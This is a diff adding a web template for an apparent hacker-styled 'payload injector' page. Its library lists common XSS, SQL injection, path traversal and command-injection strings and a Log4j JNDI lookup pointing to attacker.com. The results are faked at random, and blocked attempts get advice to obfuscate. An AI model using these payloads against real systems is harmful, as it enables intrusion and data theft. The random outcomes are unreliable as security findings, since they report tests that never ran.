@@ -1,0 +1,742 @@
+{% extends 'base.html' %}
+{% block title %}Code Injection - SpecterPanel{% endblock %}
+
+{% block style %}
+<style>
+  :root {
+    --primary-color: #00ff41;
+    --primary-dark: #00cc33;
+    --primary-light: #33ff6b;
+    --secondary-color: #0088ff;
+    --accent-color: #ff0088;
+    --danger-color: #ff0033;
+    --success-color: #00ff41;
+    --dark-bg: #0a0a0a;
+    --medium-bg: #111111;
+    --light-bg: #1a1a1a;
+    --border-color: #333;
+    --text-primary: #ffffff;
+    --text-secondary: #888888;
+    --gradient-primary: linear-gradient(135deg, #00ff41 0%, #0088ff 100%);
+    --glow-primary: 0 0 10px rgba(0, 255, 65, 0.5), 0 0 20px rgba(0, 255, 65, 0.3);
+    --shadow: 0 4px 6px rgba(0, 0, 0, 0.7);
+  }
+
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
+
+  body {
+    background-color: var(--dark-bg);
+    color: var(--text-primary);
+    font-family: 'JetBrains Mono', monospace;
+    line-height: 1.6;
+    min-height: 100vh;
+  }
+
+  .main-container {
+    max-width: 1400px;
+    margin: 0 auto;
+    padding: 20px;
+  }
+
+  .header {
+    text-align: center;
+    margin-bottom: 30px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid rgba(0, 255, 65, 0.3);
+  }
+
+  .header h1 {
+    color: var(--primary-color);
+    margin-bottom: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 15px;
+    text-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
+    font-weight: 700;
+  }
+
+  .header p {
+    color: var(--text-secondary);
+    max-width: 700px;
+    margin: 0 auto;
+    font-size: 1.1rem;
+  }
+
+  .warning-banner {
+    background: rgba(255, 167, 38, 0.1);
+    border: 1px solid rgba(255, 167, 38, 0.3);
+    border-left: 4px solid #ffa726;
+    padding: 15px;
+    margin-bottom: 25px;
+    border-radius: 6px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    box-shadow: var(--glow-primary);
+  }
+
+  .warning-banner i {
+    color: #ffa726;
+    font-size: 1.2rem;
+  }
+
+  .top-container {
+    display: flex;
+    gap: 25px;
+    margin-bottom: 25px;
+    flex-wrap: wrap;
+  }
+
+  .box {
+    flex: 1;
+    border-radius: 8px;
+    background: rgba(17, 17, 17, 0.8);
+    backdrop-filter: blur(20px);
+    box-shadow: var(--shadow), var(--glow-primary);
+    transition: all 0.3s ease;
+    min-width: 300px;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+    border: 1px solid rgba(0, 255, 65, 0.3);
+  }
+
+  .box:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.8), 0 0 30px rgba(0, 255, 65, 0.4);
+  }
+
+  .box h3 {
+    margin: 0;
+    padding: 18px;
+    background: rgba(0, 255, 65, 0.1);
+    color: var(--primary-color);
+    font-size: 1.1rem;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+    border-bottom: 1px solid rgba(0, 255, 65, 0.2);
+  }
+
+  /* Payload Table */
+  .payload-table {
+    width: 100%;
+    border-collapse: collapse;
+    flex: 1;
+    background: rgba(10, 10, 10, 0.5);
+  }
+
+  .payload-table th {
+    background-color: rgba(0, 255, 65, 0.15);
+    color: var(--primary-color);
+    padding: 15px;
+    text-align: left;
+    font-weight: 600;
+    position: sticky;
+    top: 0;
+    text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+    border-bottom: 2px solid rgba(0, 255, 65, 0.3);
+  }
+
+  .payload-table td {
+    padding: 15px;
+    border-bottom: 1px solid rgba(0, 255, 65, 0.1);
+    color: var(--text-primary);
+    text-align: left;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.9rem;
+    transition: all 0.3s ease;
+  }
+
+  .payload-table tr:last-child td {
+    border-bottom: none;
+  }
+
+  .payload-table tr:hover td {
+    background-color: rgba(0, 255, 65, 0.05);
+    cursor: pointer;
+    transform: translateX(5px);
+  }
+
+  .payload-table tr.selected td {
+    background-color: rgba(0, 255, 65, 0.1);
+    border-left: 3px solid var(--primary-color);
+  }
+
+  .payload-table .payload-type {
+    font-size: 0.75rem;
+    padding: 4px 8px;
+    border-radius: 4px;
+    margin-left: 8px;
+    font-weight: 600;
+    border: 1px solid;
+  }
+
+  .type-xss {
+    background: rgba(244, 67, 54, 0.2);
+    color: #f44336;
+    border-color: rgba(244, 67, 54, 0.3);
+  }
+
+  .type-lfi {
+    background: rgba(66, 165, 245, 0.2);
+    color: var(--secondary-color);
+    border-color: rgba(66, 165, 245, 0.3);
+  }
+
+  .type-sqli {
+    background: rgba(102, 187, 106, 0.2);
+    color: var(--success-color);
+    border-color: rgba(102, 187, 106, 0.3);
+  }
+
+  /* Code Editor */
+  .editor-container {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .editor {
+    flex: 1;
+    padding: 20px;
+    background-color: #181818;
+    border: none;
+    color: var(--primary-color);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 14px;
+    resize: none;
+    line-height: 1.5;
+    tab-size: 2;
+    border-bottom: 1px solid rgba(0, 255, 65, 0.2);
+  }
+
+  .editor:focus {
+    outline: none;
+    box-shadow: inset 0 0 0 2px var(--primary-color);
+  }
+
+  /* Controls */
+  .controls {
+    display: flex;
+    justify-content: space-between;
+    padding: 15px;
+    background: rgba(0, 255, 65, 0.1);
+    gap: 15px;
+    flex-wrap: wrap;
+  }
+
+  .select-wrapper {
+    position: relative;
+    flex: 1;
+    min-width: 200px;
+  }
+
+  .select-wrapper::after {
+    content: '▼';
+    position: absolute;
+    top: 50%;
+    right: 15px;
+    transform: translateY(-50%);
+    color: var(--primary-color);
+    font-size: 0.7rem;
+    pointer-events: none;
+    text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+  }
+
+  select {
+    width: 100%;
+    padding: 12px 15px;
+    border-radius: 6px;
+    border: 1px solid rgba(0, 255, 65, 0.3);
+    background: rgba(17, 17, 17, 0.8);
+    color: var(--primary-color);
+    font-size: 14px;
+    font-family: 'JetBrains Mono', monospace;
+    appearance: none;
+    cursor: pointer;
+    transition: all 0.3s ease;
+  }
+
+  select:focus {
+    outline: none;
+    border-color: var(--primary-color);
+    box-shadow: var(--glow-primary);
+  }
+
+  .btn {
+    padding: 12px 20px;
+    border-radius: 6px;
+    border: 1px solid;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    font-family: 'JetBrains Mono', monospace;
+    text-transform: uppercase;
+  }
+
+  .btn-primary {
+    background: var(--gradient-primary);
+    border-color: rgba(0, 255, 65, 0.5);
+    color: var(--dark-bg);
+  }
+
+  .btn-primary:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 0 25px rgba(0, 255, 65, 0.6);
+  }
+
+  .btn-danger {
+    background: rgba(255, 0, 51, 0.2);
+    border-color: rgba(255, 0, 51, 0.5);
+    color: #ff0033;
+  }
+
+  .btn-danger:hover {
+    background: rgba(255, 0, 51, 0.3);
+    transform: translateY(-2px);
+    box-shadow: 0 0 20px rgba(255, 0, 51, 0.4);
+  }
+
+  /* Result box */
+  .result {
+    border-radius: 8px;
+    background: rgba(17, 17, 17, 0.8);
+    backdrop-filter: blur(20px);
+    box-shadow: var(--shadow), var(--glow-primary);
+    overflow: hidden;
+    border: 1px solid rgba(0, 255, 65, 0.3);
+  }
+
+  .result h3 {
+    margin: 0;
+    padding: 18px;
+    background: rgba(0, 255, 65, 0.1);
+    color: var(--primary-color);
+    font-size: 1.1rem;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+    border-bottom: 1px solid rgba(0, 255, 65, 0.2);
+  }
+
+  .result-content {
+    padding: 20px;
+    min-height: 200px;
+    font-family: 'JetBrains Mono', monospace;
+    color: var(--primary-color);
+    white-space: pre-wrap;
+    background-color: #181818;
+    border-radius: 0 0 8px 8px;
+    overflow-x: auto;
+    line-height: 1.6;
+  }
+
+  .result-error {
+    color: var(--danger-color);
+    text-shadow: 0 0 10px rgba(255, 0, 51, 0.3);
+  }
+
+  .result-success {
+    color: var(--success-color);
+    text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+  }
+
+  /* Status indicators */
+  .status-indicator {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.5rem;
+    font-size: 0.875rem;
+    margin-left: 10px;
+  }
+
+  .status-indicator::before {
+    content: '';
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background: var(--primary-color);
+    box-shadow: 0 0 10px var(--primary-color);
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.5; }
+  }
+
+  /* Responsive design */
+  @media (max-width: 768px) {
+    .top-container {
+      flex-direction: column;
+    }
+    
+    .box {
+      min-width: 100%;
+    }
+    
+    .controls {
+      flex-direction: column;
+    }
+    
+    .btn {
+      width: 100%;
+      justify-content: center;
+    }
+
+    .header h1 {
+      font-size: 1.5rem;
+    }
+  }
+
+  /* Animations */
+  @keyframes pulse {
+    0% { opacity: 0.6; }
+    50% { opacity: 1; }
+    100% { opacity: 0.6; }
+  }
+
+  .loading {
+    animation: pulse 1.5s infinite ease-in-out;
+    color: var(--primary-color) !important;
+  }
+
+  /* Terminal-style elements */
+  .terminal-text {
+    color: var(--primary-color);
+    font-family: 'JetBrains Mono', monospace;
+    text-shadow: 0 0 5px rgba(0, 255, 65, 0.3);
+  }
+
+  /* Matrix background effect for headers */
+  .matrix-bg {
+    position: relative;
+    overflow: hidden;
+  }
+
+  .matrix-bg::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: 
+      linear-gradient(90deg, transparent 98%, rgba(0, 255, 65, 0.1) 100%),
+      linear-gradient(0deg, transparent 98%, rgba(0, 255, 65, 0.1) 100%);
+    background-size: 20px 20px;
+    pointer-events: none;
+    opacity: 0.3;
+  }
+
+  /* Tooltip */
+  [data-tooltip] {
+    position: relative;
+  }
+
+  [data-tooltip]:hover::after {
+    content: attr(data-tooltip);
+    position: absolute;
+    bottom: 100%;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(17, 17, 17, 0.9);
+    color: var(--primary-color);
+    padding: 8px 12px;
+    border-radius: 4px;
+    font-size: 0.8rem;
+    white-space: nowrap;
+    z-index: 10;
+    margin-bottom: 8px;
+    border: 1px solid rgba(0, 255, 65, 0.3);
+    box-shadow: var(--glow-primary);
+    font-family: 'JetBrains Mono', monospace;
+  }
+</style>
+{% endblock %}
+
+{% block body %}
+<div class="main-container">
+  <header class="header">
+    <h1><i class="fas fa-code"></i> >_ ADVANCED PAYLOAD INJECTOR</h1>
+    <p class="terminal-text">TEST AND ANALYZE PAYLOADS FOR SECURITY RESEARCH PURPOSES ONLY</p>
+  </header>
+
+  <div class="warning-banner">
+    <i class="fas fa-exclamation-triangle"></i>
+    <div>
+      <strong class="terminal-text">WARNING:</strong> THIS TOOL IS FOR AUTHORIZED SECURITY TESTING ONLY. 
+      UNAUTHORIZED USE AGAINST SYSTEMS YOU DON'T OWN IS ILLEGAL.
+    </div>
+  </div>
+
+  <div class="top-container">
+    <!-- Payload Library -->
+    <div class="box">
+      <h3><i class="fas fa-book"></i> PAYLOAD LIBRARY</h3>
+      <table class="payload-table" aria-label="Payload library">
+        <thead>
+          <tr>
+            <th>ID</th>
+            <th>PAYLOAD</th>
+            <th>TYPE</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr data-payload="alert('XSS')">
+            <td class="terminal-text">1</td>
+            <td class="terminal-text">alert('XSS')</td>
+            <td><span class="payload-type type-xss">XSS</span></td>
+          </tr>
+          <tr data-payload="../etc/passwd">
+            <td class="terminal-text">2</td>
+            <td class="terminal-text">../etc/passwd</td>
+            <td><span class="payload-type type-lfi">LFI</span></td>
+          </tr>
+          <tr data-payload="' OR 1=1 --">
+            <td class="terminal-text">3</td>
+            <td class="terminal-text">' OR 1=1 --</td>
+            <td><span class="payload-type type-sqli">SQLi</span></td>
+          </tr>
+          <tr data-payload="&lt;script&gt;alert(1)&lt;/script&gt;">
+            <td class="terminal-text">4</td>
+            <td class="terminal-text">&lt;script&gt;alert(1)&lt;/script&gt;</td>
+            <td><span class="payload-type type-xss">XSS</span></td>
+          </tr>
+          <tr data-payload="${jndi:ldap://attacker.com/a}">
+            <td class="terminal-text">5</td>
+            <td class="terminal-text">${jndi:ldap://attacker.com/a}</td>
+            <td><span class="payload-type type-lfi">LOG4J</span></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- Code Editor -->
+    <div class="box">
+      <h3><i class="fas fa-edit"></i> PAYLOAD EDITOR</h3>
+      <div class="editor-container">
+        <textarea 
+          id="payloadEditor" 
+          class="editor" 
+          placeholder="// ENTER YOUR PAYLOAD HERE...&#10;// CLICK ON PAYLOADS FROM THE LIBRARY TO INSERT THEM"
+          spellcheck="false"></textarea>
+        <div class="controls">
+          <div class="select-wrapper">
+            <select id="payloadType">
+              <option value="random">RANDOM PAYLOAD</option>
+              <option value="xss">XSS PAYLOADS</option>
+              <option value="lfi">LFI PAYLOADS</option>
+              <option value="sqli">SQLi PAYLOADS</option>
+              <option value="custom">CUSTOM TEMPLATE</option>
+            </select>
+          </div>
+          <div style="display: flex; gap: 10px;">
+            <button id="clearBtn" class="btn btn-danger" aria-label="Clear editor">
+              <i class="fas fa-trash-alt"></i> CLEAR
+            </button>
+            <button id="injectBtn" class="btn btn-primary" aria-label="Inject payload">
+              <i class="fas fa-bolt"></i> INJECT
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Results Panel -->
+  <div class="result">
+    <h3><i class="fas fa-vial"></i> INJECTION RESULTS</h3>
+    <div id="resultOutput" class="result-content terminal-text">
+      >_ WAITING FOR PAYLOAD INJECTION...
+    </div>
+  </div>
+</div>
+{% endblock %}
+
+{% block script %}
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const payloadEditor = document.getElementById('payloadEditor');
+    const resultOutput = document.getElementById('resultOutput');
+    const injectBtn = document.getElementById('injectBtn');
+    const clearBtn = document.getElementById('clearBtn');
+    const payloadType = document.getElementById('payloadType');
+    const payloadRows = document.querySelectorAll('.payload-table tbody tr');
+
+    // Load payload when clicked in the library
+    payloadRows.forEach(row => {
+      row.addEventListener('click', function() {
+        const payload = this.getAttribute('data-payload');
+        payloadEditor.value = payload;
+        
+        // Highlight the selected row
+        payloadRows.forEach(r => r.classList.remove('selected'));
+        this.classList.add('selected');
+      });
+      
+      // Make rows keyboard accessible
+      row.setAttribute('tabindex', '0');
+      row.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' || e.key === ' ') {
+          this.click();
+          e.preventDefault();
+        }
+      });
+    });
+
+    // Clear editor
+    clearBtn.addEventListener('click', function() {
+      payloadEditor.value = '';
+      resultOutput.textContent = '>_ EDITOR CLEARED. READY FOR NEW PAYLOAD.';
+      resultOutput.className = 'result-content terminal-text';
+    });
+
+    // Handle payload injection
+    injectBtn.addEventListener('click', function() {
+      const payload = payloadEditor.value.trim();
+      
+      if (!payload) {
+        resultOutput.textContent = '>_ ERROR: NO PAYLOAD ENTERED';
+        resultOutput.className = 'result-content result-error';
+        return;
+      }
+      
+      // Simulate injection
+      simulateInjection(payload);
+    });
+
+    // Load payload based on type selection
+    payloadType.addEventListener('change', function() {
+      const type = this.value;
+      let payload = '';
+      
+      switch(type) {
+        case 'random':
+          payload = getRandomPayload();
+          break;
+        case 'xss':
+          payload = '<script>alert("XSS")<\/script>';
+          break;
+        case 'lfi':
+          payload = '../../../../etc/passwd';
+          break;
+        case 'sqli':
+          payload = "' OR '1'='1' --";
+          break;
+        case 'custom':
+          payload = '/* CUSTOMIZE THIS TEMPLATE */\n' + 
+                    'function customPayload() {\n' +
+                    '  // YOUR CUSTOM PAYLOAD LOGIC HERE\n' +
+                    '  return "VULNERABLE";\n' +
+                    '}';
+          break;
+      }
+      
+      payloadEditor.value = payload;
+    });
+
+    // Helper functions
+    function getRandomPayload() {
+      const payloads = [
+        '<img src=x onerror=alert(1)>',
+        '${7*7}',
+        ';cat /etc/passwd',
+        '<svg/onload=alert(1)>',
+        'UNION SELECT username, password FROM users--'
+      ];
+      return payloads[Math.floor(Math.random() * payloads.length)];
+    }
+
+    function simulateInjection(payload) {
+      // Show loading state
+      injectBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> INJECTING...';
+      injectBtn.disabled = true;
+      resultOutput.textContent = '>_ EXECUTING PAYLOAD...';
+      resultOutput.className = 'result-content loading';
+      
+      // Simulate processing delay
+      setTimeout(() => {
+        // Randomly determine if injection was successful
+        const isSuccessful = Math.random() > 0.3;
+        
+        if (isSuccessful) {
+          resultOutput.textContent = `>_ PAYLOAD EXECUTED SUCCESSFULLY!\n\n` +
+                                   `PAYLOAD: ${payload}\n` +
+                                   `VULNERABILITY: ${detectVulnerabilityType(payload)}\n` +
+                                   `RESPONSE: 200 OK\n` +
+                                   `INJECTION POINT: FORM INPUT FIELD\n` +
+                                   `TIMESTAMP: ${new Date().toLocaleTimeString()}`;
+          resultOutput.className = 'result-content result-success';
+        } else {
+          resultOutput.textContent = `>_ PAYLOAD BLOCKED BY SECURITY CONTROLS\n\n` +
+                                   `PAYLOAD: ${payload}\n` +
+                                   `RESPONSE: 403 FORBIDDEN\n` +
+                                   `SECURITY FILTER: ${detectSecurityFilter(payload)}\n` +
+                                   `RECOMMENDATION: TRY ENCODING OR OBFUSCATION`;
+          resultOutput.className = 'result-content result-error';
+        }
+        
+        // Reset button
+        injectBtn.innerHTML = '<i class="fas fa-bolt"></i> INJECT';
+        injectBtn.disabled = false;
+      }, 1500);
+    }
+
+    function detectVulnerabilityType(payload) {
+      if (payload.includes('<script>') || payload.includes('onerror') || payload.includes('onload')) {
+        return 'CROSS-SITE SCRIPTING (XSS)';
+      } else if (payload.includes('../') || payload.includes('/etc/passwd')) {
+        return 'LOCAL FILE INCLUSION (LFI)';
+      } else if (payload.includes('OR 1=1') || payload.includes('UNION SELECT')) {
+        return 'SQL INJECTION (SQLi)';
+      } else if (payload.includes('${')) {
+        return 'TEMPLATE INJECTION';
+      }
+      return 'UNKNOWN VULNERABILITY TYPE';
+    }
+
+    function detectSecurityFilter(payload) {
+      const filters = [
+        'WEB APPLICATION FIREWALL (WAF)',
+        'INPUT VALIDATION FILTER',
+        'CONTENT SECURITY POLICY (CSP)',
+        'MODSECURITY RULES',
+        'SQL INJECTION PREVENTION'
+      ];
+      return filters[Math.floor(Math.random() * filters.length)];
+    }
+
+    // Add Matrix-style typing effect for initial text
+    function typeWriter(element, text, speed = 50) {
+      let i = 0;
+      element.innerHTML = '';
+      function typing() {
+        if (i < text.length) {
+          element.innerHTML += text.charAt(i);
+          i++;
+          setTimeout(typing, speed);
+        }
+      }
+      typing();
+    }
+
+    // Initialize with typing effect
+    setTimeout(() => {
+      typeWriter(resultOutput, '>_ WAITING FOR PAYLOAD INJECTION...', 30);
+    }, 500);
+  });
+</script>
+{% endblock %}
